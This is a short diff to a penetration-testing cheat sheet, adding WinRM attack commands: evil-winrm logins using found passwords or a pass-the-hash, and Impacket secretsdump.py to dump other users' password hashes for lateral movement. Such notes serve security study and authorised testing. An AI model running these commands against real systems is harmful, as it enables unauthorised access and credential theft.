@@ -332,9 +332,25 @@ SELECT pg_ls_dir('/');
 
 TCP port 5985
 
+Login with found username and password
+
 ```
 evil-winrm -u $USER -p $PASSWORD -i $VICTIM
 ```
+
+Login with found username and hash
+
+```
+evil-winrm -i $VICTIM -u $VICTIMUSERNAME  -H $FOUNDHASH
+```
+
+Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.
+
+```
+python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
+```
+
+****
 
 ### **IRC**
 
